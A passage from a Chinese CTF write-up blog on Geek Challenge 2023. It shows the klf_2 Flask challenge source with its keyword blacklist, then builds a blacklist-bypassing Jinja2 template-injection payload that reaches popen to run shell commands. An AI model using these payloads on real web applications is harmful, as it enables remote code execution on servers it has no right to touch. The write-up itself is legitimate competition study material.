<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Geek Challenge 2023 · zIxyd's Blog</title><meta name="description" content="前言记录一些在Geek Challenge 2023比赛中的wp；一部分写的比较详细，一部分写的比较简单，根据题目的难易度来的；
klf_2源码再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下
12345678910111213141516171"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-2"><span class="toclist-text">klf_2</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81"><span class="toclist-text">源码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toclist-text">构造关键字</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0cmd"><span class="toclist-text">构造cmd</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E7%A9%BA%E6%A0%BC"><span class="toclist-text">构造空格</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%8F%8D%E6%96%9C%E6%9D%A0"><span class="toclist-text">构造反斜杠</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="toclist-text">思路一</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toclist-text">思路二</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89"><span class="toclist-text">思路三</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EzRce"><span class="toclist-text">EzRce</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%BC%82%E6%88%96%E4%B8%8A%F0%9F%90%8E"><span class="toclist-text">异或上🐎</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezpython"><span class="toclist-text">ezpython</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toclist-text">源码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#example"><span class="toclist-text">example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pollute"><span class="toclist-text">pollute</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%9B%A8"><span class="toclist-text">雨</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-remove"><span class="toclist-text">ez_remove</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-path-os-path-join"><span class="toclist-text">ez_path(os.path.join)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#you-konw-flask"><span class="toclist-text">you konw flask?</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Pupyy-rce-%E6%97%A0%E5%8F%82RCE"><span class="toclist-text">Pupyy_rce(无参RCE)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-php"><span class="toclist-text">ez_php</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toclist-text">源码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Oa-d-i"><span class="toclist-text">&#x2F;^[Oa]:[\d]+&#x2F;i</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-one"><span class="toclist-text">pop_one</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-two"><span class="toclist-text">pop_two</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Akane"><span class="toclist-text">Akane!</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Example"><span class="toclist-text">Example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp-1"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-3"><span class="toclist-text">klf_3</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-1"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#famale-imp-l0ve"><span class="toclist-text">famale_imp_l0ve</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#change-it"><span class="toclist-text">change_it</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-2"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc-1"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flag%E4%BF%9D%E5%8D%AB%E6%88%98-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">flag保卫战(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezrfi-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ezrfi(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#scan-tool-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">scan_tool(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-sql-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ez_sql(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EZ-Smuggling-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">EZ_Smuggling(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#java-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">java(待复现)</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-2"><span class="toclist-text">klf_2</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81"><span class="toclist-text">源码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toclist-text">构造关键字</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0cmd"><span class="toclist-text">构造cmd</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E7%A9%BA%E6%A0%BC"><span class="toclist-text">构造空格</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%8F%8D%E6%96%9C%E6%9D%A0"><span class="toclist-text">构造反斜杠</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="toclist-text">思路一</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toclist-text">思路二</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89"><span class="toclist-text">思路三</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EzRce"><span class="toclist-text">EzRce</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%BC%82%E6%88%96%E4%B8%8A%F0%9F%90%8E"><span class="toclist-text">异或上🐎</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">提权</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezpython"><span class="toclist-text">ezpython</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toclist-text">源码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#example"><span class="toclist-text">example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pollute"><span class="toclist-text">pollute</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%9B%A8"><span class="toclist-text">雨</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-remove"><span class="toclist-text">ez_remove</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-path-os-path-join"><span class="toclist-text">ez_path(os.path.join)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#you-konw-flask"><span class="toclist-text">you konw flask?</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Pupyy-rce-%E6%97%A0%E5%8F%82RCE"><span class="toclist-text">Pupyy_rce(无参RCE)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-php"><span class="toclist-text">ez_php</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toclist-text">源码</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Oa-d-i"><span class="toclist-text">&#x2F;^[Oa]:[\d]+&#x2F;i</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-one"><span class="toclist-text">pop_one</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-two"><span class="toclist-text">pop_two</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Akane"><span class="toclist-text">Akane!</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Example"><span class="toclist-text">Example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp-1"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-3"><span class="toclist-text">klf_3</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-1"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#famale-imp-l0ve"><span class="toclist-text">famale_imp_l0ve</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#change-it"><span class="toclist-text">change_it</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-2"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc-1"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flag%E4%BF%9D%E5%8D%AB%E6%88%98-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">flag保卫战(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezrfi-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ezrfi(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#scan-tool-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">scan_tool(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-sql-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ez_sql(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EZ-Smuggling-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">EZ_Smuggling(待复现)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#java-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">java(待复现)</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Geek Challenge 2023</a></h3></div><div class="post-content"><p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一些在Geek Challenge 2023比赛中的wp；一部分写的比较详细，一部分写的比较简单，根据题目的难易度来的；</p>
<h2 id="klf-2"><a href="#klf-2" class="headerlink" title="klf_2"></a>klf_2</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string,send_from_directory</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secr3ttt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">secr3t</span>(): </span><br><span class="line">		klf = request.args.get(<span class="string">&#x27;klf&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">		template = <span class="string">f&#x27;&#x27;&#x27; &lt;html&gt; &lt;body&gt;</span></span><br><span class="line"><span class="string">       	 &lt;h1&gt;别找了，这次你肯定是klf&lt;/h1&gt; </span></span><br><span class="line"><span class="string">        &lt;/body&gt; &lt;img src=&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-				 blog/0071088CAC91D2C42C4D31053A7E8D2B731D69.jpg&quot; alt=&quot;g&quot;&gt; </span></span><br><span class="line"><span class="string">        &lt;h1&gt;%s&lt;/h1&gt; &lt;/html&gt; &lt;!--klf?--&gt; &lt;!-- 别想要flag？klf --&gt; &#x27;&#x27;&#x27;</span> </span><br><span class="line">		bl = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;cd&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, 				<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, 				<span class="string">&#x27;/&#x27;</span>, 			<span class="string">&#x27;flashed&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;124&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, 					<span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;length&#x27;</span>]</span><br><span class="line"><span class="comment">#&#x27;43&#x27;, &#x27;45&#x27;, </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bl: </span><br><span class="line">	<span class="keyword">if</span> i <span class="keyword">in</span> klf: </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line">a = render_template_string(template % klf) </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> a: <span class="keyword">return</span> a + render_template(<span class="string">&#x27;win.html&#x27;</span>) </span><br><span class="line">	<span class="keyword">return</span> a @app.route(<span class="string">&#x27;/robots.txt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">robots</span>():	</span><br><span class="line">	<span class="keyword">return</span> send_from_directory(os.path.join(app.root_path, <span class="string">&#x27;static&#x27;</span>), <span class="string">&#x27;robots.txt&#x27;</span>, mimetype=<span class="string">&#x27;text/plain&#x27;</span>) </span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7889</span>, debug=<span class="literal">False</span></span><br></pre></td></tr></table></figure>



<p>黑名单过滤了一大部分关键字和关键符号。但是没有<code>.</code>，<code>join</code>过滤器，<code>dict</code>，<code>= </code>，<code>()</code>，<code>set</code>,<code>|</code>,<code>attr</code>.还是有机可乘的</p>
<h3 id="构造关键字"><a href="#构造关键字" class="headerlink" title="构造关键字"></a>构造关键字</h3><p>这一部分就是构造出关键字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__().__getitem__(xx).__init__.__globals__[&#x27;popen&#x27;](xx).read()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(a,a,<span class="built_in">dict</span>(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bs=(a,a,<span class="built_in">dict</span>(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a)|join,<span class="built_in">dict</span>(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subc=(a,a,<span class="built_in">dict</span>(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br></pre></td></tr></table></figure>



<h3 id="构造cmd"><a href="#构造cmd" class="headerlink" title="构造cmd"></a>构造cmd</h3><p>再上一步的基础上，构造<code>ls</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(a,a,<span class="built_in">dict</span>(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bs=(a,a,<span class="built_in">dict</span>(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a)|join,<span class="built_in">dict</span>(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subc=(a,a,<span class="built_in">dict</span>(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> ls=<span class="built_in">dict</span>(l=a,s=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(<span class="number">117</span>)|attr(ini)|attr(glo)|attr(geti)(pp)(ls)|attr(re)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#app.py hahahaha requirements.txt static templates</span></span><br></pre></td></tr></table></figure>



<p>看到flag没有再当前目录下，尝试构造 <code>ls /</code>,这时候就需要在上一步的基础上，需要构造空格和反斜杠字符<code> </code>,<code>/</code>,</p>
<h4 id="构造空格"><a href="#构造空格" class="headerlink" title="构造空格"></a>构造空格</h4><p>空格很容易构造，在<code>()|select|string|list)</code>就有许多空格，,这里大概解释一下**()|select|string|list)**这种形式是什么意思，管道符，前一个输出当作后一个输入，就像<code>list(string(select(())))</code></p>
<h4 id="构造反斜杠"><a href="#构造反斜杠" class="headerlink" title="构造反斜杠"></a>构造反斜杠</h4><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>()|select|string|list)中没有反斜杠，那么就想一下：<strong>还有其他关键字可以以这种形式构造字符吗？</strong>，而其他关键字构造的字符下可能有我们需要的反斜杠，答案是肯定的</p>
<p>还有很多</p>
<ol>
<li><code>config|string|list</code></li>
<li><code>request|string|list</code></li>
<li><code>lipsum|string|list</code></li>
<li>……</li>
</ol>
<p>比如config和request下就有反斜杠，但是被黑名单了，我这里暂时还没有找到其他不太黑名单下有可以构造反斜杠的，只能换思路了</p>
<h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>利用格式字符串得到反斜杠，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> fxg=(<span class="string">&quot;%c&quot;</span>%(<span class="number">47</span>))%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(fxg)%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#/</span></span><br></pre></td></tr></table></figure>

<p>要利用格式字符串需要用到百分号，那么需要构造百分号:将字符url编码取第一个字符，第一个字符肯定是<code>%</code>,</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> bfh = ()|select|string|urlencode|first %&#125; </span><br></pre></td></tr></table></figure>

<p>而然并没有我想的那么简单，<code>url</code>居然被过滤了，这种思路又无法用了</p>
<h3 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h3><p>回顾一下，</p>
<ol>
<li><p>我们是想要得到反斜杠；</p>
</li>
<li><p>我们已经可以在当前目录下执行命令了，上面展示的就有<code>ls</code>；</p>
</li>
</ol>
<p>突然想起来当前目录有app.py文件，用的是flask框架，肯定会有路由，有路由肯定会用到反斜杠;现在思路比较简单了：从app.py文件中得到反斜杠；</p>
<p>列如下段flask代码中肯定会存在反斜杠：</p>
